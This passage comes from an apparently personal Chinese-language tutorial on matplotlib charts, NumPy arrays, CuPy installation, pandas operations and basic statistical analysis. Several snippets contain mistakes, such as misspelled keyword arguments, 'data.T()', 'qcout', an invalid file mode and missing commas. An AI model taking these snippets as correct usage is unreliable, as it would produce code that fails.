<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置 1 x 2 的绘图区，用法类似于plot</span><br><span class="line">figure, axes = plt.subplots(nrows=1, ncols=2)</span><br><span class="line"></span><br><span class="line">axes[0].plot(x, y)</span><br><span class="line">axes[1].plot(u, v)</span><br><span class="line"></span><br><span class="line">axes[0].legend()</span><br><span class="line">axes[1].legend()</span><br><span class="line"></span><br><span class="line">axes[0].grid(True)</span><br><span class="line">axes[1].grid(True)</span><br><span class="line"></span><br><span class="line">axes[0].set_xticks()</span><br><span class="line">axes[1].set_xticks()</span><br><span class="line"></span><br><span class="line">axes[0].set_xlabel()</span><br><span class="line">axes[1].set_xlabel()</span><br></pre></td></tr></table></figure>

<p>也可以画其他图像。</p>
<p>散点图（scatter）：观察数据的分布规律</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt.scatter(x, y)</span><br></pre></td></tr></table></figure>

<p>柱状图（bar）：统计对比数据 单柱：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt.bar(x, y, </span><br><span class="line">    width=0.5,       # 柱状图宽度</span><br><span class="line">    align=&#x27;center&#x27;, # 对齐方式</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>多柱：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt.bar(x, y1, </span><br><span class="line">    width=0.2,       # 柱状图宽度</span><br><span class="line">    align=&#x27;center&#x27;, # 对齐方式</span><br><span class="line">)</span><br><span class="line">plt.bar([i+0.1 for i in x], y2, </span><br><span class="line">    width=0.2,       # 柱状图宽度</span><br><span class="line">    align=&#x27;center&#x27;, # 对齐方式</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>直方图（histogram）：反应一组连续数据的分布</p>
<p>组数 &#x3D; 极差 &#x2F; 组距 &#x3D; (max - min) &#x2F; bins</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">distance = 3</span><br><span class="line">bins = (max(x) - min(x)) // distance</span><br><span class="line"></span><br><span class="line">plt.hist(x, </span><br><span class="line">    bins=bins,</span><br><span class="line">    density=True  # 是否显示频率</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">plt.xticks(range(min(x), max(x) + 2, distance))</span><br></pre></td></tr></table></figure>

<p>饼图（pie）：分类数据的占比情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt.pie(x, </span><br><span class="line">    labels=bins,      # 每部分名称</span><br><span class="line">    autopct=&quot;%1.2f%%&quot; # 占比显示格式</span><br><span class="line">)</span><br><span class="line">plt.axis(&#x27;equal&#x27;)     # 变圆</span><br><span class="line">plt.legend()</span><br></pre></td></tr></table></figure>

<p>如果无法正常显示中文，可以增加配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt.rcParams[&#x27;font.sans-serif&#x27;]=[&#x27;SimHei&#x27;] #解决中文显示</span><br><span class="line">plt.rcParams[&#x27;axes.unicode_minus&#x27;] = False #解决符号无法显示</span><br></pre></td></tr></table></figure>

<p>或是一劳永逸的（Windows）：</p>
<p>删除<del>&#x2F;.matplotlib&#x2F;下的缓存文件； 新增</del>&#x2F;.matplotlib&#x2F;matplotlibrc配置文件，修改内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backend:TkAgg</span><br><span class="line">font.famly: sans-serif</span><br><span class="line">font.sans-serif: SimHei</span><br><span class="line">axes.unicode_minus: False</span><br></pre></td></tr></table></figure>

<h2 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h2><p>Numpy 是一款高效的运算工具，用于快速处理任意维度的数据。</p>
<h3 id="ndarray"><a href="#ndarray" class="headerlink" title="ndarray"></a>ndarray</h3><p>数组：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">score = np.array([</span><br><span class="line">    [1, 2, 3],</span><br><span class="line">    [4, 5, 6]</span><br><span class="line">])  # ndarray 类型，2维</span><br><span class="line"></span><br><span class="line">score = np.array([</span><br><span class="line">    [</span><br><span class="line">        [1, 2, 3],</span><br><span class="line">        [4, 5, 6]</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        [1, 2, 3],</span><br><span class="line">        [4, 5, 6]</span><br><span class="line">    ]</span><br><span class="line">], dtype=np.int32)    # 3维，,32位int</span><br></pre></td></tr></table></figure>

<p>ndarray在底层使用C语言编写，内部解除了GIL，因此效率大大增加。ndarray因此也支持了向量化运算。</p>
<p>ndarray 包含了几种属性：</p>
<ul>
<li>ndarray.shape：数组维度的元组（“m行n列”等描述）</li>
<li>ndarray.ndim：数组维度</li>
<li>ndarray.size：元素数量</li>
<li>ndarray.itemsize：每个元素的长度</li>
<li>ndarray.dtype：元素类型，如np.bool，np.int32，np.uint16，np.float64，np.complex64，np.object，np.string，np.unicode等</li>
</ul>
<h3 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h3><p>数组的生成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全0数组，也可以加dtpye，order参数</span><br><span class="line">np.zeros(shape)</span><br><span class="line"># 全1数组</span><br><span class="line">np.ones(shape)</span><br><span class="line"># 现有数组生成</span><br><span class="line">np.array(list)  # 深拷贝数组</span><br><span class="line">np.copy(a)      # 深拷贝数组</span><br><span class="line">np.asarray(a)   # 浅拷贝数组</span><br><span class="line"># 生成固定范围的数组</span><br><span class="line">np.linspace(0, 100, 7)   # 0到100，7个数，闭区间</span><br><span class="line">np.arange(0, 100, 7)     # 0到100，步长7，左闭右开</span><br></pre></td></tr></table></figure>

<p>随机数生成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 均匀分布，返回0~1的一组均匀分布的数</span><br><span class="line">np.random.rand()</span><br><span class="line"># 均匀分布，从[low,high)中随机采样，size指定输出样本数目，可以是int或元组</span><br><span class="line">np.random.uniform(low, high, size=None)</span><br><span class="line"># 标准正态分布，获取一个或多个样本</span><br><span class="line">np.random.randn()</span><br><span class="line"># 正态分布，loc为均值，scale为标准差</span><br><span class="line">np.random.normal(loc, scale, size=None)</span><br></pre></td></tr></table></figure>

<p>数组操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义</span><br><span class="line">data = np.array([</span><br><span class="line">    [1, 2, 3, 4],</span><br><span class="line">    [10, 20, 30, 40],</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"># 选择元素：二维数组，选择第一行的前三个</span><br><span class="line">data[0, 0:3]  # 切片操作为左闭右开</span><br><span class="line"># 改变形状：重新分割数据，并返回</span><br><span class="line">data.reshape(shape)</span><br><span class="line"># 改变形状：直接改变原始数据</span><br><span class="line">data.resize(shape)</span><br><span class="line"># 数组转置</span><br><span class="line">data.T()</span><br><span class="line"># 类型修改</span><br><span class="line">data.astype(&quot;int32&quot;)</span><br><span class="line"># 序列化</span><br><span class="line">data.tostring()</span><br><span class="line"># 去重</span><br><span class="line">np.unique(data)</span><br><span class="line"># 一维化</span><br><span class="line">data.flatten()</span><br></pre></td></tr></table></figure>

<p>数组运算：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 逻辑运算：</span><br><span class="line">res = data &gt; 2  # 对每一个数字做计算并返回结果</span><br><span class="line">data[data &gt; 2]  # 返回满足条件的部分数据</span><br><span class="line">data[data &gt; 2] = 1.9  # 对满足条件的数据做运算</span><br><span class="line">np.all()        # 如果全部是True就返回True</span><br><span class="line">np.any()        # 如果有True就返回True</span><br><span class="line">np.where(condition, a, b)  # 满足condition的元素置为a，否则置为b</span><br><span class="line">condition = np.logical_and(con_a, con_b) # 条件与运算</span><br><span class="line">condition = np.logical_or(con_a, con_b)  # 条件或运算</span><br><span class="line"></span><br><span class="line"># 统计运算：</span><br><span class="line">np.min(data, axis=-1)   # axis 表示按行还是按列</span><br><span class="line">np.max(data, axis=-1)</span><br><span class="line">np.median()   # 中位数</span><br><span class="line">np.mean()     # 均值</span><br><span class="line">np.std()      # 标准差</span><br><span class="line">np.var()      # 均方差  std 的平方</span><br><span class="line">np.sum()</span><br><span class="line">np.argmax(data, axis=1)  # 返回最大值索引</span><br><span class="line"></span><br><span class="line"># 数组间运算，要遵循广播机制</span><br><span class="line">data + 1       # 对每一个元素运算</span><br><span class="line">data1 * data2  # 对应元素运算</span><br><span class="line"></span><br><span class="line"># 矩阵运算，此处的矩阵必须是二维数组</span><br><span class="line">mt = np.mat(data)  # 转化为矩阵</span><br><span class="line"># 矩阵乘法</span><br><span class="line">np.matmul(mt1, mt2)</span><br><span class="line">np.dot(mt1, mt2)</span><br><span class="line">mt1 * mt2</span><br><span class="line"></span><br><span class="line"># 数组合并</span><br><span class="line">np.hstack((a, b))  # 水平拼接</span><br><span class="line">np.vstack((a, b))  # 垂直拼接</span><br><span class="line">np.concatenate((a, b), axis=0)  # 任意拼接，需要设置轴</span><br><span class="line"></span><br><span class="line"># 数组分割</span><br><span class="line">np.split(x, 3)    # 按个数分割</span><br><span class="line">np.split(x, [1, 3, 5])  # 按索引分割</span><br></pre></td></tr></table></figure>

<h3 id="IO操作"><a href="#IO操作" class="headerlink" title="IO操作"></a>IO操作</h3><p>读取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 无法读取字符串</span><br><span class="line">data = np.genfromtxt(&quot;data.csv&quot;, delimiter=&#x27;,&#x27;)</span><br><span class="line"># 处理缺失值：直接删除缺失值，插值处理缺失</span><br><span class="line"># 获取缺失值个数</span><br><span class="line">nan_num = np.count_nonzero(data[:, i][t[:, i] != t[:, i]])</span><br><span class="line"># 判断缺失</span><br><span class="line">np.isnan(i)</span><br></pre></td></tr></table></figure>

<h3 id="GPU-加速"><a href="#GPU-加速" class="headerlink" title="GPU 加速"></a>GPU 加速</h3><p>首先需要<code>CUDA</code>，<code>CUDNN</code>，可以到官网下载。</p>
<p>查看本机CUDA情况可以到<code>控制面板</code>-&gt;<code>NVIDIA控制面板</code>-&gt;<code>帮助</code>-&gt;<code>系统信息</code>-&gt;<code>组件</code>里面查看。</p>
<p>通过使用Visual Studio可以开发CUDA应用，例如查看一个NVIDIA CUDA的例子： 使用Visual Stuido打开项目：CUDA安装目录-&gt;Samples，配置1_Utilities-&gt;deviceQuery-&gt;右键设置为启动项目，执行，就可以看到CUDA信息了。</p>
<p>安装 cupy：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># For CUDA 8.0</span><br><span class="line">pip install cupy-cuda80</span><br><span class="line"></span><br><span class="line"># For CUDA 9.0</span><br><span class="line">pip install cupy-cuda90</span><br><span class="line"></span><br><span class="line"># For CUDA 9.1</span><br><span class="line">pip install cupy-cuda91</span><br><span class="line"></span><br><span class="line"># For CUDA 9.2</span><br><span class="line">pip install cupy-cuda92</span><br><span class="line"></span><br><span class="line"># For CUDA 10.0</span><br><span class="line">pip install cupy-cuda100</span><br><span class="line"></span><br><span class="line"># For CUDA 10.1</span><br><span class="line">pip install cupy-cuda101</span><br><span class="line"></span><br><span class="line"># Install CuPy from source</span><br><span class="line">pip install cupy</span><br></pre></td></tr></table></figure>

<p>使用方法同numpy一样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import cupy as cp</span><br><span class="line"># numpy 用法</span><br><span class="line">x=np.ones((1024,512,4,4))*1024.</span><br><span class="line">y=np.ones((1024,512,4,1))*512.3254</span><br><span class="line">for i in range(20):</span><br><span class="line">    z=x*y</span><br><span class="line"># cupy 用法</span><br><span class="line">x=cp.ones((1024,512,4,4))*1024.</span><br><span class="line">y=cp.ones((1024,512,4,1))*512.3254</span><br><span class="line">for i in range(20):</span><br><span class="line">    z=x*y</span><br></pre></td></tr></table></figure>

<h2 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h2><p>Pandas 也是处理数据的工具。拥有便捷的数据处理能力，读取文件也方便，同时很好的的结合了matplotlib。</p>
<h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><p>尽管numpy在数据计算方面较python原始的方法有很大优势，但是同时也缺失了数据含义的展示。因此DataFrame在这方面进行了增强。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加行列索引</span><br><span class="line">row_labels = [f&quot;第&#123;i:02&#125;&quot; for i in range(10)]</span><br><span class="line"></span><br><span class="line"># 或使用日期</span><br><span class="line">col_labels = pd.date_range(start=&quot;20200101&quot;, period=5, freq=&quot;B&quot;)</span><br><span class="line"></span><br><span class="line">data = pd.DataFrame(np.random.normal(0, 1, (10, 5)),</span><br><span class="line">    index=row_labels,  # 行索引</span><br><span class="line">    colums=col_labels  # 列索引</span><br><span class="line">)  # 正态分布</span><br></pre></td></tr></table></figure>

<p>常用属性有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data.shape</span><br><span class="line">data.index   # 必须批量修改索引</span><br><span class="line">data.columns</span><br><span class="line">data.values  # 去除索引后的数据，ndarray</span><br><span class="line">data.T</span><br></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">head()  # 返回前几行</span><br><span class="line">tail()  # 返回后几行</span><br><span class="line">reset_index(drop=True)  # 重置索引</span><br><span class="line">set_index(&quot;字段名&quot;, drop=True)  # 单个索引</span><br><span class="line">set_index([&quot;字段1&quot;, &quot;字段2&quot;], drop=True)  # 多个索引</span><br><span class="line"># 对于多级索引还有属性：</span><br><span class="line">data.index.names  </span><br><span class="line">data.index.levels</span><br></pre></td></tr></table></figure>

<h3 id="Panel-（即将弃用）"><a href="#Panel-（即将弃用）" class="headerlink" title="Panel （即将弃用）"></a>Panel （即将弃用）</h3><p>是DataFrame的容器，是存储三维数据的结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pdata = pd.Panel(</span><br><span class="line">    np.arange(24).reshape(4, 3, 2),</span><br><span class="line">    items=list(&quot;ABCD&quot;),</span><br><span class="line">    major_axis=pd.date_range(&quot;20200101&quot;, period=3),</span><br><span class="line">    minor_axis=[&#x27;1&#x27;, &#x27;2&#x27;]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 查看某一组数据</span><br><span class="line">pdata[&#x27;A&#x27;]</span><br><span class="line">pdata.major_axis(&quot;&quot;)</span><br><span class="line">pdata.minor_axis(&quot;1&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h3><p>Series 是带索引的一维数组。</p>
<p>创建Series</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 数组</span><br><span class="line">sr = pd.Series(np.arange(10), index=[...])</span><br><span class="line"># 或字典</span><br><span class="line">sr = pd.Series(&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;)</span><br><span class="line"># 或已有数据</span><br><span class="line">sr = data.iloc[1, :]</span><br></pre></td></tr></table></figure>

<p>常用属性有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index   # 索引</span><br><span class="line">values  # 数值</span><br></pre></td></tr></table></figure>

<h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 直接索引，先列后行</span><br><span class="line">data[&quot;字段&quot;][&quot;记录&quot;]</span><br><span class="line"># 按名索引</span><br><span class="line">data.loc[&quot;记录&quot;][&quot;字段&quot;]</span><br><span class="line">data.loc[&quot;记录&quot;, &quot;字段&quot;]</span><br><span class="line"># 按数字索引</span><br><span class="line">data.iloc[1][2]</span><br><span class="line"># 混合索引 （即将弃用）</span><br><span class="line">data.ix[0:4, [&quot;字段1&quot;, &quot;字段2&quot;]]</span><br><span class="line"></span><br><span class="line"># 赋值</span><br><span class="line">data[&quot;字段&quot;] = 100  # 按列</span><br><span class="line">data.loc[&quot;记录&quot;, &quot;字段&quot;] = 100  # 单个</span><br><span class="line"></span><br><span class="line"># 排序</span><br><span class="line">data.sort_values(by=&quot;字段&quot;, ascending=False)</span><br><span class="line">data.sort_values(by=[&quot;字段1&quot;, &quot;字段2&quot;], ascending=False)</span><br><span class="line">data.sort_index()</span><br><span class="line"></span><br><span class="line"># 算数运算</span><br><span class="line">data[&quot;字段&quot;] + 3</span><br><span class="line">data[&quot;字段&quot;].add(3)</span><br><span class="line"></span><br><span class="line"># 逻辑运算</span><br><span class="line">data[data[&quot;字段&quot;] &gt; 2]</span><br><span class="line">data[(data[&quot;字段&quot;] &gt; 2) &amp; (data[&quot;字段&quot;] &lt; 10)]</span><br><span class="line">data.query(&quot;字段 &gt; 2 &amp; 字段 &lt; 10&quot;)</span><br><span class="line">data[data[&quot;字段&quot;].isin([100, 50])]</span><br><span class="line"></span><br><span class="line"># 统计运算</span><br><span class="line">min</span><br><span class="line">max</span><br><span class="line">mean</span><br><span class="line">median</span><br><span class="line">var</span><br><span class="line">std</span><br><span class="line">describe()  # 获取每个字段的所有统计指标</span><br><span class="line">idxmax()    # max的索引</span><br><span class="line">idxmin()   </span><br><span class="line"># 累计统计函数，查看走势</span><br><span class="line">cumsum()</span><br><span class="line">cumsum().plot()  # 顺便画图</span><br><span class="line">cummax()</span><br><span class="line">cummin()</span><br><span class="line">cumprod()</span><br><span class="line"></span><br><span class="line"># 自定义运算</span><br><span class="line">apply(func, axis=0)</span><br><span class="line"></span><br><span class="line"># 按列删除</span><br><span class="line">data.drop([&quot;字段&quot;], axis=1)</span><br></pre></td></tr></table></figure>

<h3 id="绘图"><a href="#绘图" class="headerlink" title="绘图"></a>绘图</h3><p>绘图函数如： DataFrame.plot() Series.plot()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kind 参数，图像类型</span><br><span class="line">plot(x=&quot;字段1&quot;, y=&quot;字段2&quot;, kind=&quot;scatter&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="IO操作-1"><a href="#IO操作-1" class="headerlink" title="IO操作"></a>IO操作</h3><p>读取数据，且可以识别表头等，支持CVS，JSON，HTML，Execl，HDF5，SQL等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读取CVS</span><br><span class="line">data = pd.read_csv(</span><br><span class="line">    path, </span><br><span class="line">    usecols=[&#x27;字段1&#x27;, &#x27;字段2&#x27;],</span><br><span class="line">    names=[&quot;字段名1&quot;, &quot;字段名2&quot;]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 存储CSV</span><br><span class="line">data.to_csv(</span><br><span class="line">    path, </span><br><span class="line">    columns=[&#x27;字段&#x27;],</span><br><span class="line">    header=True,      # 是否写入表头</span><br><span class="line">    mode=&quot;wa&quot;,        # 写模式</span><br><span class="line">    index=True        # 是否写入索引</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 读取HDF5</span><br><span class="line">data = pd.read_hdf(</span><br><span class="line">    path,</span><br><span class="line">    key=[&#x27;字段&#x27;]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 存储HDF5</span><br><span class="line">data.to_hdf(</span><br><span class="line">    path,</span><br><span class="line">    key=[&#x27;字段&#x27;]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 读取JSON</span><br><span class="line">data = pd.read_json(</span><br><span class="line">    path,</span><br><span class="line">    orient=&quot;records&quot;  # 读入的形式，读入成记录</span><br><span class="line">    lines=True        # 每一行是否有换行</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 存储JSON</span><br><span class="line">data.to_json(</span><br><span class="line">    path,</span><br><span class="line">    orient=&quot;records&quot;</span><br><span class="line">    lines=True</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="处理缺失值"><a href="#处理缺失值" class="headerlink" title="处理缺失值"></a>处理缺失值</h3><p>当缺失的值为NAN时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断是否有Null</span><br><span class="line">pd.isnull(data)</span><br><span class="line">pd.isnull(data).any()  # 列出所有字段是否缺失</span><br><span class="line">pd.notnull(data)</span><br><span class="line">pd.notnull(data).all()</span><br><span class="line"></span><br><span class="line"># 将所有缺失值置0</span><br><span class="line">data[pd.isnull(data)]</span><br><span class="line"></span><br><span class="line"># 删除有缺失值的样本 inplace 是否修改原始 DataFrames</span><br><span class="line">dropna(inplace=False)</span><br><span class="line"># 替换缺失</span><br><span class="line">fillna(value, inplace=False)</span><br><span class="line"># 均值替换</span><br><span class="line">fillna(data[&#x27;字段&#x27;].mean(), inplace=False)</span><br></pre></td></tr></table></figure>

<p>当缺失值为其他形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 替换</span><br><span class="line">replace(to_replace=&quot;?&quot;, value=np.nan)</span><br></pre></td></tr></table></figure>

<h3 id="数据离散化"><a href="#数据离散化" class="headerlink" title="数据离散化"></a>数据离散化</h3><p>通过对数据分类，并按分组分别统计处理数据。 方式：one-hot编码（哑编码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分组</span><br><span class="line"># 自动分组</span><br><span class="line">sr = data.qcout(data, bins)</span><br><span class="line"># 自定义分组，给定边界</span><br><span class="line">sr = data.cut(data, [10, 20, 30]) </span><br><span class="line"></span><br><span class="line"># 编码</span><br><span class="line">get_dummies(sr, prefix=&#x27;&#x27;)</span><br><span class="line"># 查看每个分组的情况</span><br><span class="line">sr.value_counts()</span><br></pre></td></tr></table></figure>

<h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 按位置拼接，如果按列拼接，要字段一致</span><br><span class="line">pd.concat([data1, data2], axis=1)</span><br><span class="line"># 按索引合并，on 索引，inner 内连接</span><br><span class="line">pd.merge(left, right, how=&#x27;inner&#x27;, on=[&#x27;字段1&#x27;, &#x27;字段2&#x27;])</span><br></pre></td></tr></table></figure>

<h3 id="交叉表与透视表"><a href="#交叉表与透视表" class="headerlink" title="交叉表与透视表"></a>交叉表与透视表</h3><p>用于探索两个变量的关系。</p>
<p>交叉表：用于查看两列数据之间的关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pd.crosstab(data[&#x27;字段1&#x27;], data[&#x27;字段2&#x27;])</span><br></pre></td></tr></table></figure>

<p>透视表：也是用于查看两列数据之间的关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pivot_table(data[&#x27;字段1&#x27;], data[&#x27;字段2&#x27;])</span><br></pre></td></tr></table></figure>

<h3 id="分组与聚合"><a href="#分组与聚合" class="headerlink" title="分组与聚合"></a>分组与聚合</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 根据字段1分组，根据字段2聚合</span><br><span class="line">data.groupby(by=&quot;字段1&quot;)[&#x27;字段2&#x27;].max()</span><br><span class="line">data[&#x27;字段2&#x27;].groupby(col[&quot;字段1&quot;]).max()</span><br></pre></td></tr></table></figure>





<h2 id="SFrame"><a href="#SFrame" class="headerlink" title="SFrame"></a>SFrame</h2><h2 id="Scipy"><a href="#Scipy" class="headerlink" title="Scipy"></a>Scipy</h2><h2 id="Scikit-Learn"><a href="#Scikit-Learn" class="headerlink" title="Scikit-Learn"></a>Scikit-Learn</h2><h2 id="Python-数据分析"><a href="#Python-数据分析" class="headerlink" title="Python 数据分析"></a>Python 数据分析</h2><p>步骤</p>
<ol>
<li>获取数据</li>
<li>探索分析，可视化</li>
<li>预处理</li>
<li>分析建模</li>
<li>模型评估</li>
</ol>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>手段</p>
<ul>
<li>数据仓库：与数据库面向业务不同，数据仓库基于主题记录，是为了数据分析服务。</li>
<li>检测与抓取：爬虫解析网页。<ul>
<li>urllib &#x2F; urllib2 &#x2F; requests &#x2F; scrapy </li>
<li>PhantomJS &#x2F; beautifulSoup &#x2F; Xpath - 解析 DOM，执行JavaScript</li>
</ul>
</li>
<li>填写，埋点，日志：<ul>
<li>填写：用户填写的信息</li>
<li>埋点：跟踪用户使用情况（页面停留时间，跳出率），用于复现用户的操作过程。</li>
<li>日志：前端日志、后端日志。</li>
</ul>
</li>
<li>计算：通过已有数据生成的衍生数据</li>
</ul>
<p>数据集</p>
<ul>
<li>Kaggle &amp; 天池</li>
<li>ImageNet &#x2F; Open Images</li>
<li>统计局、政府机构、公司财报</li>
</ul>
<h3 id="单因子数据分析"><a href="#单因子数据分析" class="headerlink" title="单因子数据分析"></a>单因子数据分析</h3><p>Pandas 读取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">df = pd.readcsv(&quot;&quot;)</span><br><span class="line">df.head(10)</span><br></pre></td></tr></table></figure>

<p>偏态：中位数与均值有差别。 S &#x3D; (1&#x2F;n) * sum((xi - xp)^3) &#x2F; ((1&#x2F;n) * sum((xi - xp)^2))^(3&#x2F;2)</p>
<p>峰度：数据集中程度的衡量。正态分布是K &#x3D; 3，一般低于1或大于5则不是正态分布。 K &#x3D; (1&#x2F;n) * sum((xi - xp)^4) &#x2F; ((1&#x2F;n) * sum((xi - xp)^2))^2</p>
<p>三大分布：卡方、t分布、F分布。</p>
<p>抽样理论：误差、精度、抽样数量。下面两种情况的计算公式不一样。</p>
<ul>
<li>重复抽样</li>
<li>不重复抽样</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">df[&quot;col&quot;].mean()  # 均值</span><br><span class="line">df[&quot;col&quot;].median()  # 中位数</span><br><span class="line">df[&quot;col&quot;].quantile(q=0.25)  # 分位数</span><br><span class="line">df[&quot;col&quot;].mode()  # 众数，可能有多个</span><br><span class="line">df[&quot;col&quot;].std()  # 标准差</span><br><span class="line">df[&quot;col&quot;].var()  # 方差</span><br><span class="line">df[&quot;col&quot;].sum()  # 求和（或字符串相连）</span><br><span class="line">df[&quot;col&quot;].skew()  # 偏态系数（负数是右偏，正数左偏）</span><br><span class="line">df[&quot;col&quot;].kurt()  # 峰态系数（负数是比正态平缓，正数比正态尖凸）</span><br><span class="line"></span><br><span class="line">import scipy.stats as ss</span><br><span class="line"># 正态分布 mvsk = (均值，方差，偏态，峰态)</span><br><span class="line">ss.norm.stats(moments=&quot;mvsk&quot;)</span><br><span class="line"># 概率密度函数</span><br><span class="line">ss.norm.pdf()</span><br><span class="line"># 概率分布函数的反函数，输入 (0, 1)</span><br><span class="line">ss.norm.ppf()</span><br><span class="line"># 概率分布函数</span><br><span class="line">ss.norm.cdf()</span><br><span class="line"># 得到符合正态分布的数字</span><br><span class="line">ss.norm.rvs(size=10)</span><br><span class="line"># F 分布</span><br><span class="line">ss.f</span><br><span class="line"># T 分布</span><br><span class="line">ss.t</span><br><span class="line"></span><br><span class="line"># 抽样</span><br><span class="line">df.sample(n=10)  # 抽10个</span><br><span class="line">df.sample(frac=0.01) # 抽 1%</span><br></pre></td></tr></table></figure>

<p>数学分类</p>
<ul>
<li>定类数据：无序，离散。数值化处理。</li>
<li>定序数据：有序，可比大小，离散。数值化处理。</li>
<li>定距数据：连续，可求差值，比大小，但没有绝对零点。例如温度，不能说谁比谁温度高几倍。归一化处理。</li>
<li>定比数据：连续，可求差值，比大小，有绝对零点，可求比值</li>
</ul>
<p>单属性分析</p>
<ul>
<li>异常值分析：<ul>
<li>连续异常值：取四分位数 Q1 Q2 Q3，则区间范围 (Q1 - k * (Q3 - Q1), Q3 + k * (Q3 - Q1)) 外的算异常值。k通常取值为 (1.5, 3)。异常值可能会让一系列数据失效。一般舍弃或取边界值代替。</li>
<li>离散异常值：定义范围以外的值。一般舍弃或用特殊标记处理。</li>
<li>知识异常值：不符合常理的值。</li>
</ul>
</li>
<li>对比分析：<ul>
<li>绝对数比较：成绩，身高</li>
<li>相对数比较：<ul>
<li>结构相对数：产品合格率，考试通过率</li>
<li>比例相对数：三大产业比例</li>
<li>比较相对数：不同时期下的某商品价格</li>
<li>动态相对数：用户数量增速</li>
<li>强度相对数：人均GDP，粮食亩产</li>
</ul>
</li>
<li>比较方法：<ul>
<li>时间维度</li>
<li>空间维度</li>
<li>经验与计划的比较：例如失业率达到某值就会社会动荡</li>
</ul>
</li>
</ul>
</li>
<li>结构分析：分析部分与总体之间的关系<ul>
<li>静态结构分析</li>
<li>动态结构分析</li>
</ul>
</li>
<li>分布分析：<ul>
<li>直接获得概率分布</li>
<li>是不是正态分布</li>
<li>极大似然</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv()</span><br><span class="line"></span><br><span class="line"># 检查去除异常值</span><br><span class="line">df[df[&quot;satisfaction_level&quot;].isnull()]</span><br><span class="line">df = df.dropna()</span><br><span class="line"># df = df.dropna(axis=0, how=&quot;any&quot;) # axis = 0 行  1 列</span><br><span class="line"># df = df.fillna()</span><br><span class="line"></span><br><span class="line"># 直方图</span><br><span class="line">sl = df[&quot;satisfaction_level&quot;].dropna()</span><br><span class="line">np.histogram(sl.values, bins=np.arange(0, 1.1, 0.1)) # (0, 1.1) 之间，间隔 0.1</span><br></pre></td></tr></table></figure>

<p>处理连续异常值</p>
